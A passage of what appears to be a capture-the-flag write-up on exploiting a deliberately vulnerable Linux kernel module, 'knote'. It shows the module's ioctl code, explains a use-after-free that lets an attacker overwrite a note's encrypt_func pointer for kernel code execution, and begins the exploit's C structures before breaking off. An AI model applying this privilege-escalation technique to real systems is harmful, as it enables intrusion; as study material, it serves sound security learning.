=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span>encrypt_func <span class=3D"tok=
en operator">=3D</span> knote_encrypt<span class=3D"token punctuation">;</s=
pan>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span>decrypt_func <span class=3D"tok=
en operator">=3D</span> knote_decrypt<span class=3D"token punctuation">;</s=
pan>
            <span class=3D"token keyword">break</span><span class=3D"token =
punctuation">;</span>
        <span class=3D"token keyword">case</span> KNOTE_DELETE<span class=
=3D"token operator">:</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>ku<span class=3D"token punctuation">.</span>idx <span cla=
ss=3D"token operator">&gt;=3D</span> <span class=3D"token number">10</span>=
 <span class=3D"token operator">||</span> <span class=3D"token operator">!<=
/span>knotes<span class=3D"token punctuation">[</span>ku<span class=3D"toke=
n punctuation">.</span>idx<span class=3D"token punctuation">]</span><span c=
lass=3D"token punctuation">)</span>=20
            <span class=3D"token punctuation">{</span>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>
           =20
            <span class=3D"token function">kfree</span><span class=3D"token=
 punctuation">(</span>knotes<span class=3D"token punctuation">[</span>ku<sp=
an class=3D"token punctuation">.</span>idx<span class=3D"token punctuation"=
>]</span><span class=3D"token operator">-&gt;</span>data<span class=3D"toke=
n punctuation">)</span><span class=3D"token punctuation">;</span>
            <span class=3D"token function">kfree</span><span class=3D"token=
 punctuation">(</span>knotes<span class=3D"token punctuation">[</span>ku<sp=
an class=3D"token punctuation">.</span>idx<span class=3D"token punctuation"=
>]</span><span class=3D"token punctuation">)</span><span class=3D"token pun=
ctuation">;</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
> <span class=3D"token operator">=3D</span> <span class=3D"token constant">=
NULL</span><span class=3D"token punctuation">;</span>
            <span class=3D"token keyword">break</span><span class=3D"token =
punctuation">;</span>
        <span class=3D"token keyword">case</span> KNOTE_READ<span class=3D"=
token operator">:</span>
            <span class=3D"token keyword">if</span> <span class=3D"token pu=
nctuation">(</span>ku<span class=3D"token punctuation">.</span>idx <span cl=
ass=3D"token operator">&gt;=3D</span> <span class=3D"token number">10</span=
> <span class=3D"token operator">||</span> <span class=3D"token operator">!=
</span>knotes<span class=3D"token punctuation">[</span>ku<span class=3D"tok=
en punctuation">.</span>idx<span class=3D"token punctuation">]</span> <span=
 class=3D"token operator">||</span> ku<span class=3D"token punctuation">.</=
span>len <span class=3D"token operator">&gt;</span> knotes<span class=3D"to=
ken punctuation">[</span>ku<span class=3D"token punctuation">.</span>idx<sp=
an class=3D"token punctuation">]</span><span class=3D"token operator">-&gt;=
</span>len<span class=3D"token punctuation">)</span>
            <span class=3D"token punctuation">{</span>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>
           =20
            <span class=3D"token keyword">if</span> <span class=3D"token pu=
nctuation">(</span><span class=3D"token function">copy_to_user</span><span =
class=3D"token punctuation">(</span>ku<span class=3D"token punctuation">.</=
span>data<span class=3D"token punctuation">,</span> knotes<span class=3D"to=
ken punctuation">[</span>ku<span class=3D"token punctuation">.</span>idx<sp=
an class=3D"token punctuation">]</span><span class=3D"token operator">-&gt;=
</span>data<span class=3D"token punctuation">,</span> ku<span class=3D"toke=
n punctuation">.</span>len<span class=3D"token punctuation">)</span><span c=
lass=3D"token punctuation">)</span>=20
            <span class=3D"token punctuation">{</span>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EFAULT<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>
            <span class=3D"token keyword">break</span><span class=3D"token =
punctuation">;</span>
        <span class=3D"token keyword">case</span> KNOTE_ENCRYPT<span class=
=3D"token operator">:</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>ku<span class=3D"token punctuation">.</span>idx <span cla=
ss=3D"token operator">&gt;=3D</span> <span class=3D"token number">10</span>=
 <span class=3D"token operator">||</span> <span class=3D"token operator">!<=
/span>knotes<span class=3D"token punctuation">[</span>ku<span class=3D"toke=
n punctuation">.</span>idx<span class=3D"token punctuation">]</span><span c=
lass=3D"token punctuation">)</span>=20
            <span class=3D"token punctuation">{</span>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>

            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span><span class=3D"token function">=
encrypt_func</span><span class=3D"token punctuation">(</span>knotes<span cl=
ass=3D"token punctuation">[</span>ku<span class=3D"token punctuation">.</sp=
an>idx<span class=3D"token punctuation">]</span><span class=3D"token operat=
or">-&gt;</span>data<span class=3D"token punctuation">,</span> knotes<span =
class=3D"token punctuation">[</span>ku<span class=3D"token punctuation">.</=
span>idx<span class=3D"token punctuation">]</span><span class=3D"token oper=
ator">-&gt;</span>len<span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">;</span>
            <span class=3D"token keyword">break</span><span class=3D"token =
punctuation">;</span>
         <span class=3D"token keyword">case</span> KNOTE_DECRYPT<span class=
=3D"token operator">:</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>ku<span class=3D"token punctuation">.</span>idx <span cla=
ss=3D"token operator">&gt;=3D</span> <span class=3D"token number">10</span>=
 <span class=3D"token operator">||</span> <span class=3D"token operator">!<=
/span>knotes<span class=3D"token punctuation">[</span>ku<span class=3D"toke=
n punctuation">.</span>idx<span class=3D"token punctuation">]</span><span c=
lass=3D"token punctuation">)</span> <span class=3D"token punctuation">{</sp=
an>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>

            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span><span class=3D"token function">=
decrypt_func</span><span class=3D"token punctuation">(</span>knotes<span cl=
ass=3D"token punctuation">[</span>ku<span class=3D"token punctuation">.</sp=
an>idx<span class=3D"token punctuation">]</span><span class=3D"token operat=
or">-&gt;</span>data<span class=3D"token punctuation">,</span> knotes<span =
class=3D"token punctuation">[</span>ku<span class=3D"token punctuation">.</=
span>idx<span class=3D"token punctuation">]</span><span class=3D"token oper=
ator">-&gt;</span>len<span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">;</span>
            <span class=3D"token keyword">break</span><span class=3D"token =
punctuation">;</span>
        <span class=3D"token keyword">default</span><span class=3D"token op=
erator">:</span>
            <span class=3D"token function">mutex_unlock</span><span class=
=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span>k=
note_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"tok=
en punctuation">;</span>
            <span class=3D"token keyword">return</span> <span class=3D"toke=
n operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
    <span class=3D"token punctuation">}</span>
    <span class=3D"token function">mutex_unlock</span><span class=3D"token =
punctuation">(</span><span class=3D"token operator">&amp;</span>knote_ioctl=
_lock<span class=3D"token punctuation">)</span><span class=3D"token punctua=
tion">;</span>
    <span class=3D"token keyword">return</span> <span class=3D"token number=
">0</span><span class=3D"token punctuation">;</span>
<span class=3D"token punctuation">}</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span><span></spa=
n><span></span><span></span><span></span><span></span><span></span><span></=
span><span></span><span></span><span></span><span></span><span></span><span=
></span><span></span><span></span><span></span><span></span><span></span><s=
pan></span><span></span><span></span><span></span><span></span><span></span=
><span></span><span></span><span></span><span></span><span></span><span></s=
pan><span></span><span></span><span></span><span></span><span></span><span>=
</span><span></span><span></span><span></span><span></span><span></span><sp=
an></span><span></span><span></span><span></span><span></span><span></span>=
<span></span><span></span><span></span><span></span><span></span><span></sp=
an><span></span><span></span><span></span><span></span><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span></sp=
an></code></pre><figcaption><code>knote_ioctl()</code> - used for interacti=
ng throug <code>ioctl()</code></figcaption></figure><p>As we can read, the =
<code>arg</code> parameter is used to supply values to a <code>knote_user</=
code> object, using <code>copy_from_user(&amp;ku, arg, sizeof(struct knote_=
user))</code>: copies <code>sizeof(struct knote_user)</code> bytes from use=
rland pointer <code>arg</code> to kernel pointer <code>ko</code>. Secondly,=
 it executes one of the <code>KNOTE_&lt;CMD&gt;</code> cases. </p><h2 id=3D=
"finding-primitives">Finding primitives</h2><p>The first step of exploit de=
velopment is identifying protections: earlier we found out that there's no =
active kernel protections (no kaslr, no smap, no smep, et cetera). Next, th=
ere's finding exploit primitives: let's start off with finding execution fl=
ow hijacking. Firstly I checked for any forms of buffer overflow bugs on th=
e stack and on the heap, but I couldn't find anything. However, once I took=
 a look at <code>KNOTE_CREATE</code>, I saw that a use-after-free bug can b=
e triggered. </p><h3 id=3D"finding-a-memory-corruption-bug">Finding a memor=
y corruption bug</h3><p>The <code>KNOTE_CREATE</code> command allocates a k=
note and it's data using <code>kmalloc</code>, which stands for <strong>k</=
strong>ernel <strong>malloc</strong>. Then, it tries to copy the userland d=
ata to the kernel note data. However if that copy fails, it will <code>kfre=
e</code> (<strong>k</strong>ernel <strong>free</strong>) both the kernel no=
te and the kernel notes' data.</p><pre class=3D"line-numbers language-c" ta=
bindex=3D"0"><code class=3D"language-c"><span class=3D"token keyword">stati=
c</span> <span class=3D"token keyword">long</span> <span class=3D"token fun=
ction">knote_ioctl</span><span class=3D"token punctuation">(</span><span cl=
ass=3D"token keyword">struct</span> <span class=3D"token class-name">file</=
span> <span class=3D"token operator">*</span>file<span class=3D"token punct=
uation">,</span> <span class=3D"token keyword">unsigned</span> <span class=
=3D"token keyword">int</span> cmd<span class=3D"token punctuation">,</span>=
 <span class=3D"token keyword">unsigned</span> <span class=3D"token keyword=
">long</span> arg<span class=3D"token punctuation">)</span> <span class=3D"=
token punctuation">{</span>
    <span class=3D"token function">mutex_lock</span><span class=3D"token pu=
nctuation">(</span><span class=3D"token operator">&amp;</span>knote_ioctl_l=
ock<span class=3D"token punctuation">)</span><span class=3D"token punctuati=
on">;</span>
   =20
    <span class=3D"token keyword">struct</span> <span class=3D"token class-=
name">knote_user</span> ku<span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">if</span><span class=3D"token punctuation=
">(</span><span class=3D"token function">copy_from_user</span><span class=
=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span>k=
u<span class=3D"token punctuation">,</span> <span class=3D"token punctuatio=
n">(</span><span class=3D"token keyword">void</span> <span class=3D"token o=
perator">*</span><span class=3D"token punctuation">)</span>arg<span class=
=3D"token punctuation">,</span> <span class=3D"token keyword">sizeof</span>=
<span class=3D"token punctuation">(</span><span class=3D"token keyword">str=
uct</span> <span class=3D"token class-name">knote_user</span><span class=3D=
"token punctuation">)</span><span class=3D"token punctuation">)</span><span=
 class=3D"token punctuation">)</span>
        <span class=3D"token keyword">return</span> <span class=3D"token op=
erator">-</span>EFAULT<span class=3D"token punctuation">;</span>

    <span class=3D"token keyword">switch</span><span class=3D"token punctua=
tion">(</span>cmd<span class=3D"token punctuation">)</span> <span class=3D"=
token punctuation">{</span>
        <span class=3D"token keyword">case</span> KNOTE_CREATE<span class=
=3D"token operator">:</span>
            <span class=3D"token comment">// unsigned values</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>ku<span class=3D"token punctuation">.</span>len <span cla=
ss=3D"token operator">&gt;</span> <span class=3D"token number">0x20</span> =
<span class=3D"token operator">||</span> ku<span class=3D"token punctuation=
">.</span>idx <span class=3D"token operator">&gt;=3D</span> <span class=3D"=
token number">10</span><span class=3D"token punctuation">)</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EINVAL<span class=3D"token punctuation">;</span>

            <span class=3D"token comment">// create knote</span>
            <span class=3D"token keyword">char</span> <span class=3D"token =
operator">*</span>data <span class=3D"token operator">=3D</span> <span clas=
s=3D"token function">kmalloc</span><span class=3D"token punctuation">(</spa=
n>ku<span class=3D"token punctuation">.</span>len<span class=3D"token punct=
uation">,</span> GFP_KERNEL<span class=3D"token punctuation">)</span><span =
class=3D"token punctuation">;</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
> <span class=3D"token operator">=3D</span> <span class=3D"token function">=
kmalloc</span><span class=3D"token punctuation">(</span><span class=3D"toke=
n keyword">sizeof</span><span class=3D"token punctuation">(</span><span cla=
ss=3D"token keyword">struct</span> <span class=3D"token class-name">knote</=
span><span class=3D"token punctuation">)</span><span class=3D"token punctua=
tion">,</span> GFP_KERNEL<span class=3D"token punctuation">)</span><span cl=
ass=3D"token punctuation">;</span>
            <span class=3D"token comment">// ...</span>
           =20
            <span class=3D"token comment">// copy userdata to note data</sp=
an>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span>data <span class=3D"token opera=
tor">=3D</span> data<span class=3D"token punctuation">;</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span>len <span class=3D"token operat=
or">=3D</span> ku<span class=3D"token punctuation">.</span>len<span class=
=3D"token punctuation">;</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span><span class=3D"token function">copy_from_user</span><span=
 class=3D"token punctuation">(</span>knotes<span class=3D"token punctuation=
">[</span>ku<span class=3D"token punctuation">.</span>idx<span class=3D"tok=
en punctuation">]</span><span class=3D"token operator">-&gt;</span>data<spa=
n class=3D"token punctuation">,</span> ku<span class=3D"token punctuation">=
.</span>data<span class=3D"token punctuation">,</span> ku<span class=3D"tok=
en punctuation">.</span>len<span class=3D"token punctuation">)</span><span =
class=3D"token punctuation">)</span> <span class=3D"token punctuation">{</s=
pan>
                <span class=3D"token function">kfree</span><span class=3D"t=
oken punctuation">(</span>knotes<span class=3D"token punctuation">[</span>k=
u<span class=3D"token punctuation">.</span>idx<span class=3D"token punctuat=
ion">]</span><span class=3D"token operator">-&gt;</span>data<span class=3D"=
token punctuation">)</span><span class=3D"token punctuation">;</span>
                <span class=3D"token function">kfree</span><span class=3D"t=
oken punctuation">(</span>knotes<span class=3D"token punctuation">[</span>k=
u<span class=3D"token punctuation">.</span>idx<span class=3D"token punctuat=
ion">]</span><span class=3D"token punctuation">)</span><span class=3D"token=
 punctuation">;</span>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EFAULT<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span>encrypt_func <span class=3D"tok=
en operator">=3D</span> knote_encrypt<span class=3D"token punctuation">;</s=
pan>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span>decrypt_func <span class=3D"tok=
en operator">=3D</span> knote_decrypt<span class=3D"token punctuation">;</s=
pan>
            <span class=3D"token keyword">break</span><span class=3D"token =
punctuation">;</span>
        <span class=3D"token comment">// ...</span>
        <span class=3D"token keyword">default</span><span class=3D"token op=
erator">:</span>
            <span class=3D"token function">mutex_unlock</span><span class=
=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span>k=
note_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"tok=
en punctuation">;</span>
            <span class=3D"token keyword">return</span> <span class=3D"toke=
n operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
    <span class=3D"token punctuation">}</span>
    <span class=3D"token function">mutex_unlock</span><span class=3D"token =
punctuation">(</span><span class=3D"token operator">&amp;</span>knote_ioctl=
_lock<span class=3D"token punctuation">)</span><span class=3D"token punctua=
tion">;</span>
    <span class=3D"token keyword">return</span> <span class=3D"token number=
">0</span><span class=3D"token punctuation">;</span>
<span class=3D"token punctuation">}</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span><span></spa=
n><span></span><span></span><span></span><span></span><span></span><span></=
span><span></span><span></span><span></span><span></span><span></span><span=
></span><span></span><span></span><span></span><span></span><span></span><s=
pan></span><span></span></span></code></pre><p>Before we dive into the deta=
ils, please realize that the kernel heap cache works like a stack containin=
g heap chunk pointers: you push them with kfree and pop them with kmalloc <=
/p><p>It took me a bit of puzzling but I figured out that we can leverage t=
his to trigger a <strong>use-after-free</strong> (UAF) bug. If we create a =
knote that fails <code>copy_from_user</code> by providing an invalid pointe=
r, the kmodule will <code>kfree(data)</code> and after that it will <code>k=
free(knote)</code> but it <strong>wont reset </strong><code>knotes[ku.idx] =
=3D NULL</code>. Additionally, the allocation is in the wrong order of <cod=
e>kmalloc(data)</code> and then <code>kmalloc(knote)</code>. Because of thi=
s, a weird UAF scenario arises in the kernel memory cache where we can over=
write <code>knotes[ku.idx]</code> with userland <code>ku.data</code>. For c=
larification of this mindboggling bug I have made the following diagram:</p=
><figure class=3D"kg-card kg-image-card kg-card-hascaption"><img src=3D"htt=
ps://pwning.tech/content/images/2023/01/image-1.png" class=3D"kg-image" alt=
=3D"" loading=3D"lazy" width=3D"1668" height=3D"317"><figcaption>Descriptio=
n of the UAF bug</figcaption></figure><h3 id=3D"finding-a-way-to-hijack-exe=
cution-flow">Finding a way to hijack execution flow</h3><p>Now we have a UA=
F bug, we need to find ways to get code execution by utilizing it. After an=
alyzing more commands, I noted that the <code>KNOTE_ENCRYPT</code> command =
calls <code>knote-&gt;encrypt_func</code>, stored in the <code>knote</code>=
 structure. </p><figure class=3D"kg-card kg-code-card"><pre class=3D"line-n=
umbers language-c" tabindex=3D"0"><code class=3D"language-c"><span class=3D=
"token keyword">struct</span> <span class=3D"token class-name">knote</span>=
 <span class=3D"token punctuation">{</span>
    <span class=3D"token keyword">char</span> <span class=3D"token operator=
">*</span>data<span class=3D"token punctuation">;</span>
    <span class=3D"token class-name">size_t</span> len<span class=3D"token =
punctuation">;</span>
    <span class=3D"token keyword">void</span> <span class=3D"token punctuat=
ion">(</span><span class=3D"token operator">*</span>encrypt_func<span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">(</span><s=
pan class=3D"token keyword">char</span> <span class=3D"token operator">*</s=
pan><span class=3D"token punctuation">,</span> <span class=3D"token class-n=
ame">size_t</span><span class=3D"token punctuation">)</span><span class=3D"=
token punctuation">;</span>
    <span class=3D"token keyword">void</span> <span class=3D"token punctuat=
ion">(</span><span class=3D"token operator">*</span>decrypt_func<span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">(</span><s=
pan class=3D"token keyword">char</span> <span class=3D"token operator">*</s=
pan><span class=3D"token punctuation">,</span> <span class=3D"token class-n=
ame">size_t</span><span class=3D"token punctuation">)</span><span class=3D"=
token punctuation">;</span>
<span class=3D"token punctuation">}</span><span class=3D"token punctuation"=
>;</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span></span></code></p=
re><figcaption>The <code>knote</code> structure</figcaption></figure><figur=
e class=3D"kg-card kg-code-card"><pre class=3D"line-numbers language-c" tab=
index=3D"0"><code class=3D"language-c"><span class=3D"token keyword">static=
</span> <span class=3D"token keyword">long</span> <span class=3D"token func=
tion">knote_ioctl</span><span class=3D"token punctuation">(</span><span cla=
ss=3D"token keyword">struct</span> <span class=3D"token class-name">file</s=
pan> <span class=3D"token operator">*</span>file<span class=3D"token punctu=
ation">,</span> <span class=3D"token keyword">unsigned</span> <span class=
=3D"token keyword">int</span> cmd<span class=3D"token punctuation">,</span>=
 <span class=3D"token keyword">unsigned</span> <span class=3D"token keyword=
">long</span> arg<span class=3D"token punctuation">)</span> <span class=3D"=
token punctuation">{</span>
    <span class=3D"token function">mutex_lock</span><span class=3D"token pu=
nctuation">(</span><span class=3D"token operator">&amp;</span>knote_ioctl_l=
ock<span class=3D"token punctuation">)</span><span class=3D"token punctuati=
on">;</span>
   =20
    <span class=3D"token keyword">struct</span> <span class=3D"token class-=
name">knote_user</span> ku<span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">if</span><span class=3D"token punctuation=
">(</span><span class=3D"token function">copy_from_user</span><span class=
=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span>k=
u<span class=3D"token punctuation">,</span> <span class=3D"token punctuatio=
n">(</span><span class=3D"token keyword">void</span> <span class=3D"token o=
perator">*</span><span class=3D"token punctuation">)</span>arg<span class=
=3D"token punctuation">,</span> <span class=3D"token keyword">sizeof</span>=
<span class=3D"token punctuation">(</span><span class=3D"token keyword">str=
uct</span> <span class=3D"token class-name">knote_user</span><span class=3D=
"token punctuation">)</span><span class=3D"token punctuation">)</span><span=
 class=3D"token punctuation">)</span>
        <span class=3D"token keyword">return</span> <span class=3D"token op=
erator">-</span>EFAULT<span class=3D"token punctuation">;</span>

    <span class=3D"token keyword">switch</span><span class=3D"token punctua=
tion">(</span>cmd<span class=3D"token punctuation">)</span> <span class=3D"=
token punctuation">{</span>
        <span class=3D"token comment">// ...</span>
        <span class=3D"token keyword">case</span> KNOTE_ENCRYPT<span class=
=3D"token operator">:</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>ku<span class=3D"token punctuation">.</span>idx <span cla=
ss=3D"token operator">&gt;=3D</span> <span class=3D"token number">10</span>=
 <span class=3D"token operator">||</span> <span class=3D"token operator">!<=
/span>knotes<span class=3D"token punctuation">[</span>ku<span class=3D"toke=
n punctuation">.</span>idx<span class=3D"token punctuation">]</span><span c=
lass=3D"token punctuation">)</span>=20
            <span class=3D"token punctuation">{</span>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>

            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span><span class=3D"token function">=
encrypt_func</span><span class=3D"token punctuation">(</span>knotes<span cl=
ass=3D"token punctuation">[</span>ku<span class=3D"token punctuation">.</sp=
an>idx<span class=3D"token punctuation">]</span><span class=3D"token operat=
or">-&gt;</span>data<span class=3D"token punctuation">,</span> knotes<span =
class=3D"token punctuation">[</span>ku<span class=3D"token punctuation">.</=
span>idx<span class=3D"token punctuation">]</span><span class=3D"token oper=
ator">-&gt;</span>len<span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">;</span>
            <span class=3D"token keyword">break</span><span class=3D"token =
punctuation">;</span>
         <span class=3D"token comment">// ...</span>
        <span class=3D"token keyword">default</span><span class=3D"token op=
erator">:</span>
            <span class=3D"token function">mutex_unlock</span><span class=
=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span>k=
note_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"tok=
en punctuation">;</span>
            <span class=3D"token keyword">return</span> <span class=3D"toke=
n operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
    <span class=3D"token punctuation">}</span>
    <span class=3D"token function">mutex_unlock</span><span class=3D"token =
punctuation">(</span><span class=3D"token operator">&amp;</span>knote_ioctl=
_lock<span class=3D"token punctuation">)</span><span class=3D"token punctua=
tion">;</span>
    <span class=3D"token keyword">return</span> <span class=3D"token number=
">0</span><span class=3D"token punctuation">;</span>
<span class=3D"token punctuation">}</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span><span></spa=
n><span></span><span></span><span></span><span></span><span></span><span></=
span><span></span></span></code></pre><figcaption>The <code>KNOTE_ENCRYPT</=
code> command</figcaption></figure><p>This means that we can execute arbitr=
ary code by committing a UAF bug, overwrite <code>knote-&gt;encrypt_func</c=
ode> and calling it. </p><h2 id=3D"creating-an-exploit">Creating an exploit=
</h2><p>So now we have our primitives to get local code execution through a=
 UAF bug in the kernel module, we can start building the exploit. Firstly, =
I defined a bunch of kernel module specific code, such as the structures an=
d <code>ioctl()</code> calls to interact with the kmodule. These structures=
 are copy/pasted from the <code>knote.c</code> file.</p><figure class=3D"kg=
-card kg-code-card"><pre class=3D"line-numbers language-c" tabindex=3D"0"><=
code class=3D"language-c"><span class=3D"token keyword">int</span> FD_KNOTE=
<span class=3D"token punctuation">;</span>

<span class=3D"token keyword">enum</span> <span class=3D"token class-name">=
knote_ioctl_cmd</span> <span class=3D"token punctuation">{</span>
    KNOTE_CREATE <span class=3D"token operator">=3D</span> <span class=3D"t=
oken number">0x1337</span><span class=3D"token punctuation">,</span>
    KNOTE_DELETE <span class=3D"token operator">=3D</span> <span class=3D"t=
oken number">0x1338</span><span class=3D"token punctuation">,</span>
    KNOTE_READ <span class=3D"token operator">=3D</span> <span class=3D"tok=
en number">0x1339</span><span class=3D"token punctuation">,</span>
    KNOTE_ENCRYPT <span class=3D"token operator">=3D</span> <span class=3D"=
token number">0x133a</span><span class=3D"token punctuation">,</span>
    KNOTE_DECRYPT <span class=3D"token operator">=3D</span> <span class=3D"=
token number">0x133b</span>
<span class=3D"token punctuation">}</span><span class=3D"token punctuation"=
>;</span>


<span class=3D"token keyword">typedef</span> <span class=3D"token keyword">=
struct</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token keyword">unsigned</span> <span class=3D"token keyw=
ord">long</span> idx<span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">char</span> <span class=3D"token operator=
">*</span> data<span class=3D"token punctuation">;</span>
    <span class=3D"token class-name">size_t</span> len<span class=3D"token =
punctuation">;</span>
<span class=3D"token punctuation">}</span> <span class=3D"token class-name"=
>knote_user_t</span><span class=3D"token punctuation">;</span>


<span class=3D"token keyword">typedef</span> <span class=3D"token keyword">=
struct</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token keyword">char</span> <span class=3D"token operator=
">*</span>data<span class=3D"token punctuation">;</span>
    <span class=3D"token class-name">size_t</span> len<span class=3D"token =
punctuation">;</span>
    <span class=3D"token keyword">void</span> <span class=3D"token punctuat=
ion">(</span><span class=3D"token operator">*</span>encrypt_func<span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">(</span><s=
pan class=3D"token keyword">char</span> <span class=3D"token operator">*</s=
pan><span class=3D"token punctuation">,</span> <span class=3D"token class-n=
ame">size_t</span><span class=3D"token punctuation">)</span><span class=3D"=
token punctuation">;</span>
    <span class=3D"token keyword">void</span> <span class=3D"token punctuat=
ion">(</span><span class=3D"token operator">*</span>decrypt_func<span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">(</span><s=
pan class=3D"token keyword">char</span> <span class=3D"token operator">*</s=
pan><span class=3D"token punctuation">,</span> <span class=3D"token class-n=
ame">size_t</span><span class=3D"token punctuation">)</span><span class=3D"=
token punctuation">;</span>
<span class=3D"token punctuation">}</span> <span class=3D"token class-name"=
>knote_t</span><span class=3D"token punctuation">;</span>


<span class=3D"token keyword">void</span> <span class=3D"token function">cm=
d_send</span><span class=3D"token punctuation">(</span><span class=3D"token=
 keyword">unsigned</span> <span class=3D"token keyword">long</span> cmd<spa=
n class=3D"token punctuation">,</span> <span class=3D"token keyword">unsign=
ed</span> <span class=3D"token keyword">long</span> idx<span class=3D"token=
 punctuation">,</span> <span class=3D"token keyword">char</span><span class=
=3D"token operator">*</span> data<span class=3D"token punctuation">,</span>=
